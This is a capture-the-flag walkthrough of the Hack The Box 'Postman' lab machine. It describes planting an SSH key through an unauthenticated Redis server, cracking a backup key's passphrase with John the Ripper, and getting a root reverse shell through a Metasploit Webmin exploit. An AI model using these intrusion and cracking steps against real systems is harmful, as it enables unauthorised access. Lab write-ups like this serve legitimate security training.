# POSTMAN

**IP**: `10.10.10.160`

**Difficulty**: Easy/Medium

### Steps
- Run a comprehensive `nmap` scan of all ports, this will identify two running services with vulnerabilities: `redis` and `webmin`

### Exploiging Redis

After scanning Postman, we learn that the port for `redis` is open on `6379` - but does it require authentication?

```
telnet 10.10.10.160 6379
Trying 10.10.10.160...
Connected to 10.10.10.160.
Escape character is '^]'.
```

This means no authentication is required! After some research, you'll see that an exploit applicable to the version of `redis` running exists that takes advantage of this.

*Script Pre-Reqs*:
- `python`
- `redis-cli`

There were a number of variations on this exploit I found written in python, but none worked for me standalone - which could simply be due to interference with other players running their scripts concurrently. Nevertheless, what succeeded on my end was a mashup of sorts, and can be found in `redis-exploit.py`

The gist of what it does, though, is after creating a new `ssh` private/public keypair, we copy the public key to a new file with new lines at the beginning and end before copying it to the open `redis` server via `redis-cli`. Modify the dbfilename, set the config directory to the `ssh` directory for the `redis` user, set the dbfilename to `authorized_keys`, save our changes, then `ssh` into the box using our newly created credentials.

Once you've ssh'd into the Postman host, you can `ls` the values of the `$HOME` directory and identify a user named `Matt` - some more searching will reveal an `id_rsa.bak` file, which is a backup ssh file, in the `/opt` directory. We have read access as the `redis` user, so I copied that file down to my workspace and saw that it's protected using a passphrase.

First, we need to convert the file into a readable format to run it through `john` (a.k.a [John The Ripper](https://github.com/magnumripper/JohnTheRipper))

```
python ssh2john.py id_rsa.bak > id_rsa.hash
```

Now we can run `john` (*NOTE: this is just where my wordlists file is saved*):

```
john --wordlist $HOME/htb/wordlists/rockyou.txt id_rsa.hash
```

It doesn't take long for `john` to crack the password, nice! That means we can switch users on the machine as Matt!

As the `redis` user, we run `sudo su - Matt` and enter our newly cracked password, and voilà, we're Matt now. 

A cursory search of Matt's files will return the `user.txt` file, victory.

### Exploiting Webmin

This one is really straightforward because there's a a `metasploit` exploit for `webmin` that works out of the box, giving you the ability to create a reverse shell. 

In `msfconsole` run `use exploit/linux/http/webmin_packageup_rce` - once in the module you will need to modify some of the options in order to successfully run the exploit:

```
set password ****** ## this is Matt's password that we cracked
set rhosts 10.10.10.160 ## this is the remote IP for the postman box
set ssl true
set username Matt 

set lhost tun0 ## this is our local IP that we're using with openvpn
[no need to change lport unless the default 4444 is in use on your machine]
```

Then type `run` and you will see that it starts a reverse TCP handler, generates a session cookie, then attempts to execute the payload you've configured. If it succeeds, a command shell session is opened. Just hit `Enter` and type `whoami` to verify that you're `root`. (*It might take a couple of seconds for a response*)

We can run a `python` script to give ourselves a better shell:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

This will output the normal terminal UI with a `root@Postman`, and from there we can iterate through the filesystem to find our `root.txt` file. 